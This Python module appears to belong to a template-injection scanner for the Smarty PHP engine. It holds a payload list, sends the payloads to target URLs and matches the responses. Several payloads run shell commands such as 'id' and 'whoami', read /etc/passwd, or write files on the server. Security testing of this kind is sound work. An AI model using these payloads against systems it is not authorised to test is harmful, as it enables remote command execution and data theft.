"""
Smarty template engine detection module.

This module implements Server-Side Template Injection (SSTI) detection
for the Smarty template engine, commonly used in PHP applications.

Author: SSTI Scanner Team
License: MIT
"""

import re
import urllib.parse
from typing import List, Dict, Any, Optional

from .base import BaseTemplateEngine, EngineResult, ConfidenceLevel, Payload


class SmartyEngine(BaseTemplateEngine):
    """
    Smarty template engine detector.
    
    Smarty is a PHP-based template engine.
    It uses {$variable} for variables and {function} for functions.
    """
    
    def __init__(self, config):
        super().__init__(config)
        self.name = "smarty"
        self.description = "Smarty template engine (PHP)"
        self.payloads = self._load_payloads()
        
        # Smarty-specific patterns for detection
        self.detection_patterns = {
            'math_result': [
                r'\b49\b',  # 7*7
                r'\b64\b',  # 8*8
                r'\b121\b', # 11*11
            ],
            'object_disclosure': [
                r'Smarty_Internal',
                r'Smarty_Resource',
                r'Smarty_Security',
                r'object\(Smarty',
                r'class.*?Smarty',
            ],
            'variable_disclosure': [
                r'\$smarty\.',
                r'smarty\.version',
                r'smarty\.template',
                r'smarty\.current_dir',
                r'array\(\d+\)\s*{',
            ],
            'function_execution': [
                r'phpinfo\(\)',
                r'system\(',
                r'exec\(',
                r'shell_exec\(',
                r'passthru\(',
            ],
            'static_call': [
                r'::.*?\(',
                r'self::',
                r'parent::',
                r'static::',
            ]
        }
    
    def _load_payloads(self) -> List[Payload]:
        """Load Smarty-specific SSTI payloads."""
        payloads = []
        
        # Basic math operations
        math_payloads = [
            "{7*7}",
            "{8*8}",
            "{11*11}",
            "{math equation='7*7'}",
            "{math equation='8*8'}",
            "{math equation='x*y' x=7 y=7}",
            "{$smarty.const.PHP_VERSION*0+49}",
        ]
        
        for payload in math_payloads:
            payloads.append(Payload(
                payload=payload,
                type="math",
                context="html",
                description="Basic mathematical operation"
            ))
        
        # Variable access and disclosure
        variable_payloads = [
            "{$smarty}",
            "{$smarty.version}",
            "{$smarty.template}",
            "{$smarty.current_dir}",
            "{$smarty.template_dir}",
            "{$smarty.compile_dir}",
            "{$smarty.config_dir}",
            "{$smarty.cache_dir}",
            "{$smarty.request}",
            "{$smarty.session}",
            "{$smarty.server}",
            "{$smarty.env}",
            "{$smarty.get}",
            "{$smarty.post}",
            "{$smarty.cookies}",
            "{$smarty.const}",
            "{$smarty.capture}",
            "{$smarty.config}",
            "{$smarty.section}",
            "{$smarty.foreach}",
        ]
        
        for payload in variable_payloads:
            payloads.append(Payload(
                payload=payload,
                type="variable_access",
                context="html",
                description="Smarty variable access"
            ))
        
        # PHP constants access
        const_payloads = [
            "{$smarty.const.PHP_VERSION}",
            "{$smarty.const.PHP_OS}",
            "{$smarty.const.PHP_SAPI}",
            "{$smarty.const.__FILE__}",
            "{$smarty.const.__DIR__}",
            "{$smarty.const.DIRECTORY_SEPARATOR}",
            "{$smarty.const.PATH_SEPARATOR}",
            "{$smarty.const.PHP_EOL}",
        ]
        
        for payload in const_payloads:
            payloads.append(Payload(
                payload=payload,
                type="constant_access",
                context="html",
                description="PHP constant access"
            ))
        
        # Server variable access
        server_payloads = [
            "{$smarty.server.SERVER_SOFTWARE}",
            "{$smarty.server.SERVER_NAME}",
            "{$smarty.server.REQUEST_METHOD}",
            "{$smarty.server.REQUEST_URI}",
            "{$smarty.server.SCRIPT_NAME}",
            "{$smarty.server.QUERY_STRING}",
            "{$smarty.server.DOCUMENT_ROOT}",
            "{$smarty.server.HTTP_HOST}",
            "{$smarty.server.HTTP_USER_AGENT}",
            "{$smarty.server.REMOTE_ADDR}",
            "{$smarty.server.REMOTE_HOST}",
            "{$smarty.server.REMOTE_USER}",
        ]
        
        for payload in server_payloads:
            payloads.append(Payload(
                payload=payload,
                type="server_access",
                context="html",
                description="Server variable access"
            ))
        
        # Function calls
        function_payloads = [
            # Built-in functions
            "{php}echo 'TESTSTRING';{/php}",
            "{php}phpinfo();{/php}",
            "{php}print_r(get_defined_vars());{/php}",
            "{php}var_dump($smarty);{/php}",
            "{php}echo PHP_VERSION;{/php}",
            "{php}echo php_uname();{/php}",
            
            # Assign function
            "{assign var='test' value='TESTSTRING'}{$test}",
            "{assign var='calc' value=7*7}{$calc}",
            
            # Eval-like functionality
            "{eval var='7*7'}",
            "{eval var='phpinfo()'}",
            
            # Include/fetch functions
            "{include file='/etc/passwd'}",
            "{fetch file='/etc/passwd'}",
            "{include file='file:///etc/passwd'}",
            "{fetch file='file:///etc/passwd'}",
        ]
        
        for payload in function_payloads:
            payloads.append(Payload(
                payload=payload,
                type="function_call",
                context="html",
                description="Function call exploitation"
            ))
        
        # Static method calls (Smarty 3+)
        static_payloads = [
            "{Smarty_Internal_Write_File::writeFile($smarty.template_dir|cat:'/test.txt','TESTSTRING',false)}",
            "{system('id')}",
            "{exec('whoami')}",
            "{shell_exec('cat /etc/passwd')}",
            "{passthru('ls -la')}",
            "{file_get_contents('/etc/passwd')}",
            "{readfile('/etc/passwd')}",
            "{highlight_file('/etc/passwd')}",
            "{show_source('/etc/passwd')}",
            "{php_uname()}",
            "{phpinfo()}",
            "{get_current_user()}",
            "{getcwd()}",
            "{getmyuid()}",
            "{getmygid()}",
            "{getmypid()}",
        ]
        
        for payload in static_payloads:
            payloads.append(Payload(
                payload=payload,
                type="static_call",
                context="html",
                description="Static method call"
            ))
        
        # Self-referencing and class manipulation
        self_payloads = [
            "{self::getStreamVariable($smarty,'file:///etc/passwd')}",
            "{self::function('system')('id')}",
            "{Smarty_Internal_Template::clearCache()}",
            "{Smarty_Security::isTrustedStaticClassAccess()}",
            "{$smarty->getTemplateVars()}",
            "{$smarty->getConfigVars()}",
            "{$smarty->getStreamVariable('string:TESTSTRING')}",
        ]
        
        for payload in self_payloads:
            payloads.append(Payload(
                payload=payload,
                type="self_reference",
                context="html",
                description="Self-referencing exploitation"
            ))
        
        # Modifier exploitation
        modifier_payloads = [
            "{7*7|var_dump}",
            "{'TESTSTRING'|upper}",
            "{'TESTSTRING'|lower}",
            "{'test'|capitalize}",
            "{'test'|count_characters}",
            "{'test'|strlen}",
            "{'/etc/passwd'|file_get_contents}",
            "{'ls -la'|system}",
            "{'id'|exec}",
            "{'whoami'|shell_exec}",
            "{'cat /etc/passwd'|passthru}",
            "{$smarty.const.PHP_VERSION|var_dump}",
        ]
        
        for payload in modifier_payloads:
            payloads.append(Payload(
                payload=payload,
                type="modifier",
                context="html",
                description="Modifier exploitation"
            ))
        
        # URL-encoded payloads
        url_payloads = [
            "%7B7%2A7%7D",  # {7*7}
            "%7B%24smarty%7D",  # {$smarty}
            "%7B%24smarty.version%7D",  # {$smarty.version}
        ]
        
        for payload in url_payloads:
            payloads.append(Payload(
                payload=payload,
                type="math",
                context="url",
                description="URL-encoded payload"
            ))
        
        # Context-specific payloads
        attr_payloads = [
            "x{7*7}",
            "{7*7}x",
            "x{$smarty}",
            "{$smarty}x",
        ]
        
        for payload in attr_payloads:
            payloads.append(Payload(
                payload=payload,
                type="math",
                context="attribute",
                description="Attribute context payload"
            ))
        
        # Advanced exploitation techniques
        advanced_payloads = [
            # Template inheritance and blocks
            "{block name='test'}TESTSTRING{/block}",
            "{extends file='string:TESTSTRING'}",
            
            # Configuration access
            "{config_load file='/etc/passwd'}",
            "{#test#}",
            
            # Section and foreach with data access
            "{section name=test loop=$smarty.get}{$smarty.get[test]}{/section}",
            "{foreach from=$smarty.post item=item}{$item}{/foreach}",
            
            # Capture and manipulation
            "{capture name='test'}TESTSTRING{/capture}{$smarty.capture.test}",
            "{capture assign='var'}TESTSTRING{/capture}{$var}",
            
            # Error triggering for information disclosure
            "{$undefined_variable}",
            "{undefined_function()}",
            "{$smarty.undefined_property}",
            "{include file='nonexistent_file'}",
            "{fetch file='nonexistent_file'}",
            
            # Direct object manipulation
            "{$smarty->clearAllCache()}",
            "{$smarty->clearCache()}",
            "{$smarty->getTemplateDir()}",
            "{$smarty->getCompileDir()}",
            
            # Stream wrappers
            "{include file='php://filter/read=convert.base64-encode/resource=/etc/passwd'}",
            "{fetch file='php://input'}",
            "{include file='data://text/plain;base64,VEVTVFNUUklORw=='}",
            
            # Resource access
            "{$smarty->createTemplate('string:TESTSTRING')->fetch()}",
            "{$smarty->getRegisteredObject('test')}",
        ]
        
        for payload in advanced_payloads:
            payloads.append(Payload(
                payload=payload,
                type="advanced",
                context="html",
                description="Advanced Smarty exploitation"
            ))
        
        return payloads
    
    async def test_payload(self, url: str, payload: str, **kwargs) -> EngineResult:
        """
        Test a single payload against the target URL.
        
        Args:
            url: Target URL
            payload: Payload to test
            **kwargs: Additional arguments (http_client, method, data, headers)
        
        Returns:
            EngineResult with test results
        """
        http_client = kwargs.get('http_client')
        method = kwargs.get('method', 'GET')
        data = kwargs.get('data', {})
        headers = kwargs.get('headers', {})
        
        if not http_client:
            return EngineResult(
                is_vulnerable=False,
                confidence=ConfidenceLevel.LOW,
                payload=payload,
                response="",
                evidence="No HTTP client provided",
                engine=self.name
            )
        
        try:
            # Determine injection point and method
            if method.upper() == 'GET':
                # URL parameter injection
                if '?' in url:
                    test_url = url.replace('INJECT', payload)
                    if 'INJECT' not in url:
                        # Add payload to first parameter
                        if '=' in url:
                            test_url = re.sub(r'(=)([^&]*)', f'\\1{payload}', url, count=1)
                        else:
                            test_url = f"{url}&test={payload}"
                    else:
                        test_url = url.replace('INJECT', payload)
                else:
                    test_url = f"{url}?test={payload}"
                
                response = await http_client.get(test_url, headers=headers)
            else:
                # POST data injection
                if data:
                    # Inject into existing data
                    test_data = data.copy()
                    if 'INJECT' in str(test_data):
                        test_data = {k: v.replace('INJECT', payload) if isinstance(v, str) else v 
                                   for k, v in test_data.items()}
                    else:
                        # Add payload to first field or create test field
                        if test_data:
                            first_key = next(iter(test_data))
                            test_data[first_key] = payload
                        else:
                            test_data['test'] = payload
                else:
                    test_data = {'test': payload}
                
                response = await http_client.post(url, data=test_data, headers=headers)
            
            # Analyze the response
            return self.analyze_response("", payload, response.get('text', ''))
            
        except Exception as e:
            return EngineResult(
                is_vulnerable=False,
                confidence=ConfidenceLevel.LOW,
                payload=payload,
                response="",
                evidence=f"Request failed: {str(e)}",
                engine=self.name
            )
    
    def analyze_response(self, original_response: str, payload: str, response: str) -> EngineResult:
        """
        Analyze response for Smarty SSTI indicators.
        
        Args:
            original_response: Original response (baseline)
            payload: Payload that was sent
            response: Response to analyze
        
        Returns:
            EngineResult with analysis results
        """
        if not response:
            return EngineResult(
                is_vulnerable=False,
                confidence=ConfidenceLevel.LOW,
                payload=payload,
                response=response,
                evidence="Empty response",
                engine=self.name
            )
        
        # Check for direct payload reflection (likely not vulnerable)
        if payload in response and not any(pattern in response.lower() for pattern in ['smarty', 'php']):
            return EngineResult(
                is_vulnerable=False,
                confidence=ConfidenceLevel.LOW,
                payload=payload,
                response=response,
                evidence="Payload reflected without execution",
                engine=self.name
            )
        
        evidence_parts = []
        confidence = ConfidenceLevel.LOW
        is_vulnerable = False
        
        # Math operation detection
        if any(p in payload for p in ['7*7', '8*8', '11*11']):
            for pattern in self.detection_patterns['math_result']:
                if re.search(pattern, response):
                    evidence_parts.append(f"Mathematical operation executed: found {pattern}")
                    confidence = ConfidenceLevel.HIGH
                    is_vulnerable = True
                    break
        
        # Object disclosure detection
        for pattern in self.detection_patterns['object_disclosure']:
            if re.search(pattern, response, re.IGNORECASE):
                evidence_parts.append(f"Object disclosure detected: {pattern}")
                confidence = max(confidence, ConfidenceLevel.HIGH)
                is_vulnerable = True
        
        # Variable disclosure detection
        for pattern in self.detection_patterns['variable_disclosure']:
            if re.search(pattern, response, re.IGNORECASE):
                evidence_parts.append(f"Variable disclosure detected: {pattern}")
                confidence = max(confidence, ConfidenceLevel.MEDIUM)
                is_vulnerable = True
        
        # Function execution detection
        for pattern in self.detection_patterns['function_execution']:
            if re.search(pattern, response, re.IGNORECASE):
                evidence_parts.append(f"Function execution detected: {pattern}")
                confidence = max(confidence, ConfidenceLevel.HIGH)
                is_vulnerable = True
        
        # Smarty-specific error messages
        smarty_errors = [
            'Smarty_Compiler_Exception',
            'SmartyException',
            'Smarty_Internal_ParseTree',
            'Unable to load template file',
            'Syntax error in template',
            'Unknown tag',
            'Unknown modifier',
            'Undefined variable',
            'Call to undefined function',
        ]
        
        for error in smarty_errors:
            if re.search(error, response, re.IGNORECASE):
                evidence_parts.append(f"Smarty error detected: {error}")
                confidence = max(confidence, ConfidenceLevel.MEDIUM)
                is_vulnerable = True
        
        # PHP-specific indicators
        php_indicators = [
            'PHP Version',
            'PHP/.*?Server',
            'phpinfo()',
            'Zend Engine',
            'System.*?Linux',
            'root:x:0:0',  # /etc/passwd content
            'uid=',  # id command output
            'gid=',  # id command output
        ]
        
        for indicator in php_indicators:
            if re.search(indicator, response, re.IGNORECASE):
                evidence_parts.append(f"PHP execution indicator: {indicator}")
                confidence = max(confidence, ConfidenceLevel.HIGH)
                is_vulnerable = True
        
        # Check for successful $smarty variable access
        if '$smarty' in payload:
            smarty_patterns = [
                r'Smarty.*?\d+\.\d+',  # Version string
                r'smarty.*?version.*?\d+',
                r'template.*?dir',
                r'compile.*?dir',
                r'cache.*?dir',
            ]
            
            for pattern in smarty_patterns:
                if re.search(pattern, response, re.IGNORECASE):
                    evidence_parts.append(f"Smarty object access: {pattern}")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # Check for constant access
        if 'smarty.const' in payload:
            const_patterns = [
                r'PHP.*?\d+\.\d+',  # PHP version
                r'Linux|Windows|Darwin',  # OS
                r'apache|nginx|cli',  # SAPI
                r'/.*?/',  # File paths
            ]
            
            for pattern in const_patterns:
                if re.search(pattern, response, re.IGNORECASE):
                    evidence_parts.append(f"PHP constant access: {pattern}")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # Check for server variable access
        if 'smarty.server' in payload:
            server_patterns = [
                r'Apache|nginx|IIS',  # Server software
                r'GET|POST|PUT|DELETE',  # HTTP methods
                r'HTTP/1\.[01]',  # HTTP version
                r'\d+\.\d+\.\d+\.\d+',  # IP addresses
            ]
            
            for pattern in server_patterns:
                if re.search(pattern, response, re.IGNORECASE):
                    evidence_parts.append(f"Server variable access: {pattern}")
                    confidence = max(confidence, ConfidenceLevel.MEDIUM)
                    is_vulnerable = True
        
        # Check for string manipulation results
        if any(func in payload.lower() for func in ['upper', 'lower', 'capitalize']):
            if 'TESTSTRING' in payload:
                if ('upper' in payload.lower() and 'TESTSTRING' in response) or \
                   ('lower' in payload.lower() and 'teststring' in response) or \
                   ('capitalize' in payload.lower() and 'Test' in response):
                    evidence_parts.append("String manipulation function executed")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # Check for assign function execution
        if '{assign' in payload:
            assign_match = re.search(r"assign.*?var='(\w+)'.*?value='([^']*)'", payload)
            if assign_match:
                var_name = assign_match.group(1)
                var_value = assign_match.group(2)
                if var_value in response:
                    evidence_parts.append(f"Assign function executed: ${var_name} = {var_value}")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # Check for specific test strings
        test_strings = [
            'TESTSTRING',
            'teststring',
            'Test',
        ]
        
        for test_str in test_strings:
            if test_str in response and test_str in payload:
                evidence_parts.append(f"Test string executed: {test_str}")
                confidence = max(confidence, ConfidenceLevel.HIGH)
                is_vulnerable = True
        
        # Check for file inclusion results
        if any(func in payload for func in ['include', 'fetch', 'file_get_contents']):
            file_patterns = [
                r'root:x:0:0',  # /etc/passwd
                r'bin/bash',    # /etc/passwd
                r'daemon:x:',   # /etc/passwd
                r'\[.*?\]',     # Config file sections
            ]
            
            for pattern in file_patterns:
                if re.search(pattern, response):
                    evidence_parts.append(f"File inclusion successful: {pattern}")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # Compile evidence
        if evidence_parts:
            evidence = "Smarty SSTI detected: " + "; ".join(evidence_parts)
        else:
            evidence = "No Smarty SSTI indicators found"
            
        return EngineResult(
            is_vulnerable=is_vulnerable,
            confidence=confidence,
            payload=payload,
            response=response[:500],  # Limit response size
            evidence=evidence,
            engine=self.name
        )
    
    def get_payloads_for_context(self, context: str) -> List[Payload]:
        """Get payloads suitable for a specific context."""
        return [p for p in self.payloads if p.context == context]
    
    def get_payloads_by_type(self, payload_type: str) -> List[Payload]:
        """Get payloads of a specific type."""
        return [p for p in self.payloads if p.type == payload_type]
    
    def encode_payload(self, payload: str, context: str) -> str:
        """
        Encode payload for specific context.
        
        Args:
            payload: Original payload
            context: Target context (url, html, attribute, etc.)
        
        Returns:
            Encoded payload
        """
        if context == "url":
            return urllib.parse.quote(payload)
        elif context == "html":
            return payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
        elif context == "attribute":
            return payload.replace('"', '&quot;').replace("'", '&#x27;')
        elif context == "javascript":
            return payload.replace('\\', '\\\\').replace('"', '\\"').replace("'", "\\'")
        else:
            return payload
    
    def get_info(self) -> Dict[str, Any]:
        """Get engine information."""
        return {
            'name': self.name,
            'description': self.description,
            'payloads': len(self.payloads),
            'contexts': list(set(p.context for p in self.payloads)),
            'types': list(set(p.type for p in self.payloads)),
            'framework': 'Smarty',
            'language': 'PHP',
            'syntax': '{$variable} and {function}'
        }
